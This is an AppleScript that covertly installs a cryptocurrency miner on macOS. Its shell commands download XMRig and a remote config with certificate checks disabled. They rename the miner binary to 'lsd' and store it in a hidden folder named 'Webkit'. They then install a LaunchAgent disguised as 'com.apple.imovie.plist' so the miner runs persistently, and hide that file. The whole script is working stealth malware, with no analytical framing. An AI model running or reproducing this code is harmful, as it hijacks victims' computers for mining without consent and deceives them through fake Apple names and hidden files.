do shell script "/bin/rm -rf /Users/Shared/Webkit"
do shell script "/bin/mkdir /Users/Shared/Webkit"
do shell script "/usr/bin/chflags -R hidden /Users/Shared/Webkit"
do shell script "cd /Users/Shared/Webkit && curl -LOk https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-macos-x64.tar.gz && open /Users/Shared/Webkit/xmrig-6.12.2-macos-x64.tar.gz"

do shell script "cd /Users/Shared/Webkit && /bin/sleep 1s && cd xmrig-6.12.2 && /bin/sleep 1s && /bin/mv xmrig /Users/Shared/Webkit/lsd && /bin/sleep 1s && cd /Users/Shared/Webkit/ && curl -LOk https://codeload.github.com/UnixCro/XMRig/zip/refs/heads/main && /bin/sleep 1s && /bin/mv main main.zip && /bin/sleep 1s && unzip main.zip && /bin/sleep 1s && /bin/rm -rf xmrig-6.12.2 xmrig-6.12.2-macos-x64.tar.gz && /bin/sleep 1s && /bin/mv /Users/Shared/Webkit/XMRig-main/config.json /Users/Shared/Webkit/ && /bin/rm -rf main.zip && /bin/sleep 1s && /bin/mv /Users/Shared/Webkit/XMRig-main/com.apple.imovie.plist /Users/Shared/Webkit/"

do shell script "/bin/rm -rf ~/Library/LaunchAgents/com.apple.imovie.plist && /bin/mv /Users/Shared/Webkit/com.apple.imovie.plist ~/Library/LaunchAgents && /bin/sleep 1s && /bin/launchctl load ~/Library/LaunchAgents/com.apple.imovie.plist && /bin/rm -rf /Users/Shared/Webkit/XMRig-main && /usr/bin/chflags hidden ~/Library/LaunchAgents/com.apple.imovie.plist"